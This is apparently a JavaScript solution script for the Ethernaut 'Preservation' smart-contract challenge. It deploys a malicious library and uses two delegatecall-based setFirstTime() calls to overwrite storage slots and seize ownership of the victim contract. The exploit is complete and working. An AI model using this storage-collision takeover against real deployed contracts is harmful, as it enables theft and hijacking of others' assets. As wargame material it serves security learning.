const loader = require('../loader.js')
const web3 = require('../web3.js')
const instance = require('../prompt.js');

(async () => {
  try {
    console.log('Load victim Preservation contract.')
    const victim = loader.web3.fromArtifact('Preservation', instance)

    console.log('Load malicous library contract.')
    let attacker = loader.web3.fromArtifact('HackPreservation')

    console.log('Deploy malicious library contract...')
    const { options: { address } } = await attacker.deploy().send()

    console.log('Load deployed malicious library contract')
    attacker = loader.web3.fromArtifact('HackPreservation', address)

    console.log('Convert malicious library address to uint')
    const addressInt = web3.utils.hexToNumberString(address)
    console.log(`Address as int is ${addressInt}`)

    console.log('Pass it to first setFirstTime() call: delegatecall timeZone1Library to set address in slot 0 to malicious library address...')
    await victim.methods.setFirstTime(addressInt).send()

    console.log("Convert player's address to uint")
    const playerInt = web3.utils.hexToNumberString(web3.eth.defaultAccount)
    console.log(`Player's address as int is ${playerInt}`)

    console.log("Pass it to second setFirstTime() call: delegatecall timeZone1Library to set address in slot 2 to player's address...")
    await victim.methods.setFirstTime(playerInt).send()

    console.log('Done. Submit yor instance.')
  } catch (err) {
    console.log(err.message)
  }
})()
